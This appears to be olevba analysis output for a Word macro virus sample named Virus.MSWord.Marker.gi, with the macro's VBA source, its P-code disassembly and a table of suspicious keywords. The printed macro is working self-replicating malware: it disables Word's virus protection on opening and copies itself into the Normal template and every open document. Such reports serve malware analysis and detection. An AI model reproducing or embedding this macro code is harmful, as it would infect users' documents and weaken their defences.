olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'MARKER_RV_001'

Application.Options.VirusProtection = False

If Me <> NormalTemplate Then
 Infect NormalTemplate, ActiveDocument
 NormalTemplate.Save
End If

For i = 1 To Application.Documents.Count
   Infect Application.Documents.Item(i), NormalTemplate
Next
   
End Sub
    
Private Sub Infect(a, b As Object)
 mstr = a.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1)
 vers = Val(Mid(b.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 12, 3))
 
 If (Mid(mstr, 2, 9) <> "MARKER_RV" Or Val(Mid(mstr, 12, 3)) < vers) Then
    a.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
 If a.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    a.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, b.VBProject.VBComponents.Item(1).CodeModule.Lines(1, b.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
End Sub

Private Sub Document_New()
    Document_Open
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.gi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2777 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x000E "MARKER_RV_001'"
' Line #2:
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #4:
' Line #5:
' 	Ld id_FFFF 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #6:
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	ArgsCall Infect 0x0002 
' Line #7:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #8:
' 	EndIfBlock 
' Line #9:
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #11:
' 	Ld i 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	Ld NormalTemplate 
' 	ArgsCall Infect 0x0002 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub Infect(a, B As Object))
' Line #17:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St mstr 
' Line #18:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld B 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000C 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St vers 
' Line #19:
' Line #20:
' 	Ld mstr 
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "MARKER_RV"
' 	Ne 
' 	Ld mstr 
' 	LitDI2 0x000C 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	Ld vers 
' 	Lt 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld B 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld B 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Private Sub Document_New())
' Line #29:
' 	ArgsCall Document_Open 0x0000 
' Line #30:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

